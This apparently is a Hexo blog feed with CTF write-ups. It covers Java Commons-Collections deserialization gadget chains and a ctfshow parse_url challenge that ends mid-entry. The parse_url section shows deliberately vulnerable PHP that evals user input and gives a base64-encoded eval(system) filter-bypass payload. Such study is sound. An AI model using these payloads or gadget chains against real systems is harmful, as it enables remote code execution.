fe61504af057547f5bad49b90ec624f0a7fcbae4a2ce3badf46465ca92981d951f44d9d244b8cb1a3a99017c7db5fdd8fa786418dc10a0944dce853c4206234b1f2a120dcf0f9d5d68e51918272fe84dcab8c5430746b0e9375fda1b452fab9268060f31de1ac9e592dc8630fffaaf0f3a80272ecd4d3704afbb3c542010c48738c0f3363fa7524dd727cafae0345f13d86569dd4b929355222792aa23d7b8c7b1257cbc867ecf84e418e8640a6b1cb83021535f4cf3fba48dd6ed3f15266d9dd56d2a66f601c284acea027678c70dcd895ab9a9592ccb199f09ae2ab91815b190fe35f65f58405345bcf4b5e67d0a24ce12b989c49c734ed9a26874504f181971ffccdcaff15fa950a12b7112dd0deb09c92b837010481e9311b8e097c4b864325a89e09dfc229fe75f4777aa7121af9d2cfee8250e51fe9b57719e8b27b81bfa9152dfdfbf1a4dbe6a1bc6e85fb1cb2c3bb4aac69e156e48af7096d3be626970c7ee750b09d47f3ad4e69a4af2044c1108bb1f6a5f42413be10de79f38e45c86c07716d21ab739f2a0ed86c79514f25d761f6696ea206ee8fc88d2012c47a058325fb59c80129599d8941ba5156642dd53cfbdd87390a072531685e984b7e56d8e8e4b528ae7b3630e4cddb06e263c3d37147771b3ca17005cd03aef4957a7dfc0ca0bd6cf0f10ce90cae04ae2dcf2c3781cf95ff22639fcd0b733f4296394289657b1b6fb78b0de2ae44f4b257500194a8bb91911ca4b0759021e1ade3c7eb5052964b8660ea6a21c16bf95947795e49550bf95cc80bf0b46f05d4d23d16e3d33c903b20bcd7ccef9ed6e920f1cd2b6911587488310b638c7cdc7b96a22481edadb9914f2a8cc99910b5d17941585fcb5fdc247470eaee969bf971a3993ef26f50f9c14360708506ecc007af1949fc7a8d06262cc30b5b4453f5ea97f39c2f308b8e2887c4ce3527b9369f61945c91450bace0d26cc5a3bc0389428655ba5df5461464b6bc70bdd14b1b8e8d79a37a66bd00eef72ce188efd958a56cd2d541941a934da5f7d6f020ff8cd90a91a2a4cac7d4aa90f1902715d1673885fd09204778d968b090cce078d2fe2d2cd8151e243913140b37261016f8515ec9336c66e052f14743356dd869cf50b12158d64f611b18795e207c1e486f8e4a61b249c1dc7e19f9be1ccff7dcbbf933cd0324153779138659b55c46e5572e3f62daf95c3c8ed2a4e6947d56110c905396883a90700f7705a1337ef6cee6242305d8b9105121e9b4e095ea21f51949687009257ac323d93043bca35e48725347ec56209ed44f7594c3c4b3d37adc9dce1efdb6f544218072b3bdf8335df43a55c6ed471d1cc66a284f4faabb73a8e394304fe85de6b7613fd8c60436ab662549168c1769a32808ba5918b29a50bbe4f224edb340335fcc0ba664be64260afd6f1b5cd8f29785bc23d1d4d486a1898f642cb5af0c01ee1795436f8d87cc24c9d2702f8ba58cc949a3fadabbfca6fb14b79253112fb6284d206f0016f67c9cf39f157b0c3a1f1f8cc5bab53fae7346fa7bf4e197a29a88d6a9003d0b03f6207d940cb39e24e51a33fa9c6e3e5088a99d63b1062a4cfe0bf99ea7e831a93ac35e540258741504197aca14b7fad5ac030fe90b802029aa9efbe8910c5b4d95d7dbeb9040a2e75e0f82eb54a17bc4b2eca51627710421647236821ab79905e11ad50be5bf0abd23e2e05ead5c67f70d922e0fc3b9b741dd74566c694933ef26219e4d5e5b3c817a416da57f358c1aef1db17fa905c87ec3b30c66850142015e5da4529c77f41516c37dd2f0522358d8591ab1da4a893f618da4e26d6ca9439b188f5eb8b0a5b327f2674dbea9a94d785dcf6f06803a74d918c40321a11b3986df87b425fb4d20b5f8ea2f49054d0602b491be9d1915c92fe8773e949d2cb0147c7fd4e96c7136fc2229520c417bc5e36911b772379a45233aa4f9534e1676c0a4ff32ff2f5822bfa14e6697cba1b015dd137b405ee950482e7145483b4793d32d9562cbdd8cfe514bb4228464a813d5a21b856b65465fdde61365029af45bc2da5c07e5d46af0634835b12d019e8c1165e4cc4561af0bd175bf14316577510769d2b87ba5d37365cce84000b1d53ba92d06d66bdebc61d30bb9a8a433ba7a89c0a5a2d8cb84a5bc0be7707189179f418e2505e2856b09192d6551c4f5098efd28c94adbd7e981d944047ac5b9092b97282f699bebf503d97dd2946eacd89cec80c710aaf761af21f494248ae35896918b7a92a9c196b22518f506d04191a7a30f4fc760f2d5a7dbd99e8ea85f1bb9574d8a59ca2cbfe0e534afbfe524b2ee3bcd2e1667caf8808c2b9631168bb11037b36ad54bcf56b9de81fc20bc9d5c577eeb7b4deda94b741d3d5ec8ebb1320b2131a3bfe011479ded3d976c39cc413c8e54cc0c9fedf44fb0b085bf4749a539d6ff2078a002b614b151d64df42143872428f32a358e34d58d2565a138247df810c39d1ac3c610f5699be58d45a7b032dcbaecc854cedc6984bf411489f0759e5170e0a3f1205ef343522efc075823e156b9dd6dde34f4f1cf3b8b6236438736ed23bbe2199743d567d546dc778175c08d073671491781065876ca67136376170c0294929868eb3d54999e1d235858184243f616896d596951342eb7cd2740a2413a07a1c1e5ad6ce8aef7d6ce23a727d4920bcbc2ac56a84fbfbb119dd0b1be0189b7f7ecb7202b559757c81061728e878d7611aededf2b311c714d1887321d6280bef41a950617dd7ea8b10577b3da163160c93aee86ae22b11e9b3c74800f431fba5c8b410c018ce4c5093f8df481a26ece13abe27d205fa333d95d798897ad0d80ce692775bae7b8781d190410d31845930a899ff39dbdf88ec4a645414de96c45dcb581a689eae713bbe2d90a23a6870befc705109a7fb29d658c32c79d08151750b255af3eec268bc12c01abe2e70b064845393964a86791b93d5a62f6ee48c55c86267aea0bdbdf5cb1e269d3904529fc39e8a1ed1e78c65c0b8880692d4b1113f1b49d6224ac102424c31bce444a9c303573d86e919cfb47854a9c32d1946c248038e19191f3c9bd76175c3bfa31e6daa3a5923d433e6e0e1359d949c96d55f3036b88c6cdd220cfe39e9415ef157a4a68d30fac38a3b41a854ed732efaff0eb04d8517015899333ddbb46894964632477f06bcfa4d0bea01146c79c6026ec61353f88bc6f089ce07ddbe37e462c6c9f64c66a842d4f3e602d79de8350e5f55d9ff5ddfce14f778d4681ce7fec5008f1124e659af59356ed72fcca3dcb7bda6ec9353e6c0e00dbe53674fb780a07dc3ae942f1ee1d514b604cb0456e5db9e44b3360e959329d2ab36945791dd3050e16721c9bbc6858aae5b9aeb48f0594d295716512ba1f447d34c5b9b02acb58422f8fdb6544485ad8ae1dd729e4ff041421f97f2a564a1cac98939a9eef5b56a772806a8a16a04ebb14223df9096b22fe0fa26055e5afc30cbfe4fb1af0b3ddea6c3867bd67ab5119f17cfc70a9d7b31eb3b86820b637c35cb55806ae1a43e575bfc73e167b1951d637af2e63da35572e37f6303c607e0d85122735466ad07cb6df479f93164ae2eb39600705f0fc4f70cb309f083101b2fad4351c9880ac3c07f4fa6d01394f230426ac0c6a0d4639a7b1a0cc86a6866a6f6bbb26399d37b16569b2636ecf6b155206a4f8242b2ac71d2130f17e9fcf07979516ff2e7e9ccee4043eded6e9f02a0806c51c8812dfa7bd504fc5a36b3206bb0bc406427a2e1bbca319d1a12d49d0a73e1328eef0297f2ea32f8b98e52dc4618712af68dd47046353dc43f7025e9301d2d43e1958142ba0d28a309633f50ab08e0a40615af65f3dae8b202f0231eb4088b4d112ad92cacb04217ef10b0f9445e0d80b956ee49e0a29278fd858eda82dff4c95bec57c445c1ffb2ac2d2c74756d1b9ce12e73a8bf21e67a5b863467e09c40452590a8cc3cb1420a5c1f2f1ea2840f098f84cda8444785d553388cfb279e33ecd71b55630a1129cc0381e778f08e66e5ca21667b4f4c81e3bd2ecefe279f87c1527afecbaba16011e95ffe8ff6694d10991dd261f88a6ee88abb64535a47d1204e4402a93778c04a0fedf91faaf1e7c807941ae0bc20ed163596ea70f18d19cd90b3986b092860a7db8f59dc3b961524ec1efcff7997bab2e84715567e697b344835b9411683a8f17c45df9de30f6f79339a0f6a1a5ca9822ddac90fc6b64c22acc599707da94239db506ec6f60b2cd4084e6f4d192360d621d6e99ef64a249628a01cd1e867b5ead4c6b05fa1a1e49b789208216c291344342a7affb576ccb1db3f78ec970e8f116110b5ab5177572cea06bd11777b0d3667d04bdbc92f3dda83e7c5b3eb6c1efece07bb36597bbfcea6dbaf05da19cbfb1f117c11b7deea2ce3b1f4d14f22322e41e614bbbd068e23692beb1b73309e8611cda53584ca70d92d2e16564f7ecb82f7d8fa00b4291616d3be47d63d3da982656119e4054b7052574521ca69a6c911c6cf7be326d7c5dcdac9b4ae206ef37e2344159909296d3ba3ea20545f8b366b01b02396139909f93428459d9f36440bace2808cb602ae09e0ad0147cd624dfb082133036203e2f1fcbf6e337a33bc09b7240a825009a2b1b3bf7843616909d81be75c81ffc8806505acb1d6fc6c1123aff494d47106b6759e469d510512c42de10b62219a2568d7c0c78665858a1fcd4b4f1805497b4f1a95ec6bf47599f830740f9979e85c666b2f564a53eff96ca404b5249516b0c2a7be1c6401aa356a9ffbd8f7a9387bab47553f50e1521da2b3f34c4d6339703fc7c3f4d8155d8240828132b48c1b97cac82c224ec276351df3483f6c2bc186d49ddaa75de5fb7252a1e6daa93a623daa0d923ec9dbe929fbd1c3942250c1f7461ca7f41d4d0c50a026a6a53abbe4ba56c6e1f5886f31a0070c23e3b35fa257a5beec8bb4a3f487dba47d404544eac34bf802db93fb8fb8c586b3f7c0dc846c7e513c5c9a9e3fde60fca7c4d2defcdb3478cf7dc9b05fa83c8955e69bbe68bd21019aca5d9d33e4cb0d02fd7bf8b8d0a6804b2a6063b94452047e96eaf1a103518b9c5b393bfc4ed9528cb48700bcb42cb29e413946dd08a4a209f4d4f64232a48125e1ddf112fbf9a3ba0523a83d2d2280b77664f6b5f19ddbdec82ce93972c821f056906b2f98be97b84c52d4c0c7d06b83cb3e54319ca5cc4e4fd572368be57a0982e96b8ee749b6f236312a26454a508b8854409b33af3cc56aa6dfb42dacf5b908332b907e6e60d073df37aecc0ff72dd934a7719f55ff7822aeb6016b9148cbe22f9df4f3f379a149181cf4e9b3eb3caf7e141de1e9f7cce8320ef6e6870e698ce52ecbffd3a625a78686cbd75e2e0526d17606c0c631227929a82aaef0c83b2c1e812f1eb3ab9b6d66e091fa59808aae47aff67a6d70bd1bf6b1ef001fefc30342f8d1682edb9a81fad425419423c8095f8e5a9f2883a24ed8d0753f59d3c634d22cfddfcc1631c13b4f696d16cca2837666f1d426c718c0883e88878729154a21d02b31dc81d2010948c5505a512716480770fc2f505fb8f4376b7e8544c719508a963a4719c40bac1f4134524a8a599a66419d83fb64c9686998ff631f58c904163c9426dcb7188bf4d164546007b27fb79d2b9849d60920d405a848f05246b795d11b388de1d0e6e2a458943eb9e29811d1e262901f06b3e76dc9e6640d115e59a0771b2f024c3c166b355d8848412ba1e1b8a91a871d60c8dd283c386c27691e33ef7a1f8975b0f23c2810efe60a99b386350c1234b6233da95544e878cd72c7c40e2c10a16c3bf92fad8ed108f657abe190f3b681fde48f43672d1fc29b06492822a3c40d8a5207292f9885befec488f01b898edad3a85606a73283dcb168d6f8b35e84679efa4ba0ac210c7e4810529b63b8e5151bca30cdf9e8bb91fe9c39148758855fce28ef0c753afe45d15dd0a085db9f3220e29b14e25c2eac5f974ef09332198062b8e21ef1fd49a18c85728038530d717a9b1076e3941bbf2faf30011ae527fcb0e023fc6cce258234468104a712fb8fa129c0e57745fe13e892ae57bd86f6c5c133288a15e17d5636e46cd28dbbfcf9b10df8d4c5070e2500e1e7c1768fc08e1833dc973772eaf904dc96cf72afc338d4a57a49a20d0969e93e0b649604d41b38d8a0da3230eefccc05f410ab6bee5e2c90c07ec4ac3ee3c5c4af3fe12aaf4c56c4ae4565901a5089925879fcce7f6769e0623f2e16aecc80b4effcc37b7d8d9abcf5090ea93f9a455131b74073d92589de07b2c32a556defdafe2ab229f207f1d235b86e949987f2664b5ecb888eab139dc220db7827ed75df8d19dfa25ba786fbc83a0baa9dbb7feee1a6386f04fcd8424a5da2a6eaa3546c9b2693b48d013be1ed7bc7c81890f7f80746ebf3e76c55231d9e58a855ecc176d6d5f0dd0df7a6690e25e9baaf8fab80c065a476f19c72ff883fcaa8ed6dd31be18287735e6fc78b7ca2f40b7eed40f145bc2bc0d68fb0fc1cc76e6933912b2d814af6e7b5f6defe7d2202631a062ead78d89ffac605ff0b8bb28fc75edab0342cc13f6827d5fdb75dec7b1319804b8e53490f3c58b6f19c0e54f2c38251d3a332e0f012da74104cad8500647b00908f16a20fbe0d29149b99842f281443f8c6a505fbb550a3bf87f4e0d479fb3498867f2bcacb962c5672334306efc7c6854d37d8c8cd26a87bc1f2b68ed79dee3a7b0b0b7fee33c95828da51ccb0a4f663ae439167cfd16e231b40d82610ec5cde182c5612b45be924e1c8ce3607a6317a2590bd172d27baf3d9dd02b4a8bbcdcc7ea9863ea938916b5aad192c7f94e14ab0162f1095fe102836f3252ae07e9a98211da766769c994b9745a0ec116f3c7876326880bef8709fe8ceaded8567218c571320894601f18d0d1c113343d81e6035db2b3ef4641e2a9f3828ca9619c39753d9530e0ee9b089c76258255e8e93b69b8258c1a20174af3bdc5bbda7e171ca0dd3999f960ec667bd7d5de35d6c8943ebc61baabf2b33e96d1735e1da5150bc124f9ed200eccca36e8ccf049e5dd2f35b3bc52aa40f3ab9e357f4f8fc3e3b4ec6be0972ddaa87d66e2c65a92321a840d258724c75b04806cd8187e2ccc9ebb0d680ad5217a1002d94ac84184e797b277af585b7dc4d30634793ab4c6492e1834e2d12064b0d66948c432fe7f7a72522e14f90b07e1fe658a0edfa45aa4a3e82ffa7afd76bb7bd04905c3fcfb536f0d3535773c7bcff65bc144978ac81a9fea9818f82cc2261d33a8f4049cd40de34e36be2e7bb07206adc1d073391f44910bb539b606b1c7cb102cd6862bb5eca21f706bb925177299568cf48d007a86b591237ef6f78914bb87da1f4d7ecbd4a6aeea9de4fc46e89e52b844222da281c3ba689d26bde718852653b3775c5cd494ba0042b49b1118046adfadaa2dfb2121c1394c4fea54a91b3faf6799f7ba00e265ee30990f6439bd74a1739cfcdf37c96bf4ab15231e6f780bb8d004b9270865f5e7cd7d51783a7b0dcb07f90a037559f738e1006873ce30470d90e60fecb7d9733099a2e9a460f98bae85d6d69fc1ec8f51464e0e200627551facf4cab2d1e6e51b56d36991e526bb2201a7aef8dc72a5f0ef8db6d16a3f98b4d5fcb5c60530fd43670240de430d804de1455e0b8405199dd1c8e1da2a18b4f26941a62f98ec6cbaddf30198683ff74108a0ea9876d4cc3e38e5eab68f5154a04ebac0bd74e9137dbe78e7b0cf1364b05b064afd4b62cf5bb132bc8f219367928c5f3d06d561f1c60bf7dd03de26c8da6b6ddbc0825edaa8fcb085e39a76085c88dc847d273a2354ca3842e65fd4141c0336666d72e72e2c457e28f23c31871b7d9ad0b8daad928c13425767f96e52fbf0eca822823cd67f640870b826d4e976dcad41e2ef9607b481ea59b6146c32feb5a48d156bb6d9cc7e14cf615f789ac91007d6f7f4df04ba10215a48b96e08a9d8724be930b91e9c451af671c97e063b8d7695fa092b2c14b232e029ac740783e2afce0c4dab7eae84747a66bcbf5900f0ddaf243e67463d053db836fa7bfdf20114278bc8dd251533c79d127ce95363351e95a96f14ae926ffc0ceef54fd60f35d5ed3e5e4bdb4644255db888717bcb7e3d9fc4210ffd1ad3a486a5194bae49bc8df5dd47381e0d9106737cb72fd047d921ec423cf9e878109eb758cc34e360f36d7969e13903826da294e99f8036d549e6c85f7fb84ae436f89e1d416ade9c95b98d19fe181374678696398166bce2bd8ad62af46355715eddf10e65f8c727348844012c7a250a76ceee54a5d36b20bac283db30e8f7ac7854f44833c8ddc7b2685a57992f7e84b6cf273a7fea79360d36c16fd94f70f5c135b8ed8b834e17ab10b28bc3f21f782dd1368c56f5cb6b1f068d44e749117b99038486effc071a3ebf642bd71d04713c3b0a3cd0d71792aa7a92cf7b33b0ef7e2efc2f7877c956789edd38428d6febd0359a4880e1c70ba3170fb9d2d24be5fdc74bd6fd57a156561ad329f43bb75fbf2d65bfb6528809d98a28191c03ad44541e9d60747f4d939f3152cde0433666f23e12a21613b0a5e10e16c0b45892b0aa478f5f3489e44af0c50c7e7114ecc9778fd817b393c1958349a8012bfd7324540cdf8c223dc646fcfcb455fc5109f784973a67c6c2d0bc974a67e03fbe446a014c8641e079647493a51fb8d92e00aa0ee6da4743ac880d685b5f3133b9b7057d700f72231473f402de45b116e4a5e5f45417db82465a2231fef5215b5f5600cdd4d3d608a407a300da0b8638cc4552bc54c5a8d7ce2b05fca347a99ab05591211d45ace4d6f4d8d7a23b260a6b3beea44a0eb7686da252a1d3e4a9cd32b0a133770ae0e743b5d7bf87f43db679e7d2d31a9557d120096d4a3d8defed0b8996db1700c19dac80db595ac236397c8b21aecba2fe237cfea3a44bb31925b009a82e0aeaac540e68d56efc08a31090af2368e784dc81e031206446c9accc9091c3770f0c75386993a02f22aad228402a4ca18eb9296bdbb10123e94a509987e9d2f73bc64a743edd85675487d613d10c6a576ceff0f03d49afaea874e72bddc016cfffb8ca507c2192b1f34d333a691849e28f35a8074fe4d0143f7036168588215b5991aa485c2bb66a8a23ddf383b5835458af24280644f1bf596862d5bb625b4d256644f0d5c9bf507071bc5db689bd0bf4995f6d1601c042292af7c5b20d245ae5cf5b6283d7121113a07edb4062a5c5a7ed2300f727cdfa168e671905de4cc44eb2ca0c83b2211ce8e9c167ec3de03147337ced7ad956f0c4547d514409f2a53ff55cc4eb06f5a84cb3dcc6eaa6d7bfa3e58e533b910eae5267fb75ce099a1e23251208cf1383bd8eb1a2d2452de67bbd4b66c9e17e4bd7a1f6819ddcfcdbf672de783b320e3343f0fcb319599baf06cae8add1a106c8043ec1c869de5284506cd30bb1fd200c5f846fc5be7d5e23151c2a7cdf5ecd79f29d38e7787a10dd5b27bbca8e7e8978d1e0a75d0800fa7bda66f417632dfa033e02149041e1edd29702dc8de199efec0bd90bc04514befc0773bac0528c55ad5fd6763ae51a2939b3171cfaf4cbe6c1f02cbb31bb5a69a3e5e4af1bea67b8fadc20ad43a8b23113fec037f34e82d829879aa911bd2d1c67ff43db0da0f961e08d90fd4045ba7104f18ec23e80483d3bcf237c75ca520a2411224aebfcb398f78149fb14f33d77c3459f98d89cb655fc4b9c8eef86738c897dc635e0cddd8a081b7ee89133d37ab58aa9816ef2da4dbe480e70e420aea6c5676648dafa89c5f3e1745369189a71e581e6dec507e75414539521cb09d0ee647ef580314ebae8abfc2a1e108d394b2c206c4ff3a4409d89199df84f33490e9fbab98b6d8bc9df54fb11f432f89d5839ee6855e57ca2f6e1a65404fb88bd7acd86a111f08790edeff61855a5cda2d6ef7d12ab5eda36ba6fd205f34d1310eee0f86388f91d98942779a89e6df131a044250fe7fe8629cad086899d45b04eda1d06dcf1364a4b44bd611e1c8c5d6be20e4fada6e2e8bda5e17f6a70deb9c86fa0aa10363481d55c1aa83a4d5ca5c7b5936c30364e179ab1052b29245e7a3636561401257f996e0418a58fe8fc79795e22217973c0ffecc551ea07d04e1db5b5cfab5bcb925a8ad41687e1211989341be01b8951a22be36980d02912aa19c9b2a40cfb96e07df6912b0980f7e2c464a5ee4b5e43160ebe17692b8359bcf5324c92101e773143b6d169acb8b3eadfd0fb9a4c15a359710f2ed3dcddf995aca365a1ab0de5e2ac1fb0fd595fecb8e8aba007fa8c0e4b9912a462a35257a5ecf8ff3f08d524b6e9a2099547e68edc7471368d1fa1cd0499a29861ac98d0d9261afcdf70334049c7d82861671771a28b2abc1610bf1a23a0fb515e97e794f4a4a76f5f7e251d643b13aa387f054ebf423e6c3c2feed34c15518d3805c9b5b92cec79ee95c17e68ade26bee0be0f9580876f2cd88f2f6969cc641d256d0ad4b7443daaf528347886f63b545b44e5c869cf267d5f1700e53406925d3a34eee520c24daf384fbf32a74425b2d2fd0657d3a1a3f581e688bcd4aec98e8b7505c602706a8bc50458ed776b8621cab2accd5e0be1bf00218a9f87f17ba85c3d4b51e561a805a7facb2c201539c1fded9295a5498901590699ae5461a5f6bb1848315df368a1cce77385f2f19cfde4cd4cd5348af7271d0e6ac67a12b5de0f983495c0f4199ad15391914cabaa9011b1f90d4a4aa92cb4f8ed77f46e4555930f41a3a0fb12f0217225ccfa1781deb7502c4a4272e6b3123f624edd92f907d971cb539c8946a5f321c6754b73aa238db20bbf6aef8afba553260eec0d6696cfafe4febb66be918c1c04201459bf745005a1685e7cfd6ccc2d6d99766f76f4f9e9844862eb3272ffd94f9d5a2e795e5007a9e4da9b33a81a34b1bd50d2d258b95f63ee5fd5ecda3fab4a1850d8e3347fd0c1ee189e9668a40dfc744b7573de5dedb9f7ca7f3881c751065001ece367cd1feface5b68875abf82ace5e0b2f45de906fc111d65719efdcbf5bd8c34fd4f7dd13251fd2b803aff6278268b78034a98df727425d1ba3a7d38ca7a8d55ac8a5f478c31d32bcc8fe8b7f3933d05f5ac7130ec96d87f3ece6786ca203e5066b910d5926d55fbc0d0d992396728c71ce34a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-代码执行" scheme="https://ke1nys.github.io/tags/show-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-cc2+cc4+cc5+cc7</title>
    <link href="https://ke1nys.github.io/posts/858f6c3d.html"/>
    <id>https://ke1nys.github.io/posts/858f6c3d.html</id>
    <published>2023-05-19T13:11:01.000Z</published>
    <updated>2023-05-21T14:28:20.538Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话是导入cc4的maven依赖</p><p><img src="../images/image-20230521192554529.png" alt="image-20230521192554529"></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>这里cc4和前面的不同是在调用<code>transform</code>方法的不同</p><p><img src="../images/image-20230521194855536.png" alt="image-20230521194855536"></p><p>然后就是接着找谁能调用这个<code>compare</code>方法了</p><p>根据发现这条链子的作者写的文章来看</p><p>入口点是<code>PriorityQueue</code>这个类</p><p><img src="../images/image-20230521195351157.png" alt="image-20230521195351157"></p><p>然后就到<code>heapify()</code></p><p><img src="../images/image-20230521195429690.png" alt="image-20230521195429690"></p><p>然后接着是<code>siftDown</code>函数</p><p><img src="../images/image-20230521195509503.png" alt="image-20230521195509503"></p><p>然后接着是<code>siftDownUsingComparator</code>函数</p><p><img src="../images/image-20230521195535898.png" alt="image-20230521195535898"></p><p>这里的话就和上面的方法对应上了</p><p>这里的话都是在<code>PriorityQueue</code>这个类里边进行调用那么因为<code>comparator</code>参数可控，所以就可以直接调用<code>TransformingComparator.compare()</code>方法了，然后就可以调用这个方法里边的<code>transform</code>方法了</p><p>最终目的都是为了调用到<code>ChainedTransformer.transform</code>方法</p><p>这里的话就会有疑问，就是为什么这里的链子在<strong>cc3</strong>里不能用，<code>PriorityQueue</code>是jdk里的类，那么出问题的肯定不是他，而是<code>TransformingComparator</code>这个类的问题</p><p><img src="../images/image-20230521202532028.png" alt="image-20230521202532028"></p><p><img src="../images/image-20230521202543387.png" alt="image-20230521202543387"></p><p>就是因为cc3里的这个类没有继承<code>serialize</code>所以就不能进行序列化操作，所以问题就出现在这里了</p><p>这里因为啥设的这些参数我这里就不写了  <a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">视频这里有讲</a></p><p><strong>接下来就懒得跟了，就是修改调用<code>transform</code>方法的变式罢了</strong></p><p><img src="../images/image-20221010090837206.png" alt="img"></p><p>就是跟着这张图片来找就行了</p><p>cc链子可以用很多种方法来互相组合来进行调用，就是可以用执行代码和调用<code>transform</code>的方法来进行排列组合掉用</p><p><strong>理论上应该只有1和3受jdk版本影响</strong></p><p><a href="http://miku233.viewofthai.link/2022/10/10/Commons-Collections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">这是b站评论大佬写的总结</a></p><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">b站视频</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话是导入cc4的maven依赖&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230521192554529.png&quot; alt=&quot;image-20230521192554529&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;CC4&quot;&gt;&lt;a href=&quot;#CC4&quot;</summary>
      
    
    
    
    
    <category term="java反序列化-cc2+cc4+cc5+cc7" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc2-cc4-cc5-cc7/"/>
    
  </entry>
  
  <entry>
    <title>java-二次反序列化</title>
    <link href="https://ke1nys.github.io/posts/6c257651.html"/>
    <id>https://ke1nys.github.io/posts/6c257651.html</id>
    <published>2023-05-17T08:51:44.000Z</published>
    <updated>2023-05-17T12:28:35.161Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://tttang.com/archive/1701/#toc_">二次反序列化</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://tttang.com/archive/1701/#toc_&quot;&gt;二次反序列化&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="java-二次反序列化" scheme="https://ke1nys.github.io/tags/java-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-周末大挑战-parse_url</title>
    <link href="https://ke1nys.github.io/posts/153b575d.html"/>
    <id>https://ke1nys.github.io/posts/153b575d.html</id>
    <published>2023-05-15T09:42:21.000Z</published>
    <updated>2023-05-16T07:46:06.509Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ctf-show.feishu.cn/docx/Al7GdBB5WoI9pMxod9acyzXFnfe">官方wp</a></p><p><strong>看了wp之后，学到了一个新技巧</strong></p><p>就是在<code>/</code>用不了的时候，我们可以使用先进行编码，然后在进行解码的方式来进行绕过</p><p>例如   <code>eval(base64_decode(&#39;c3lzdGVtKCJscyAvIik7&#39;));</code></p><p>这里的话先介绍一下这个<code>parse_url</code>函数</p><p>这里话在ctfshow的web入门里也有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://user:pass@host/path?args=value#anch&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果--------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; host</span><br><span class="line">    [user] =&gt; user</span><br><span class="line">    [pass] =&gt; pass</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; args=value</span><br><span class="line">    [fragment] =&gt; anch</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-10 10:58:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这里的host的话就是<code>http://xxxx/</code>   里面的xxx，那么这里可控，于是就尝试看能不能进行命令执行</p><p><img src="../images/image-20230515175832497.png" 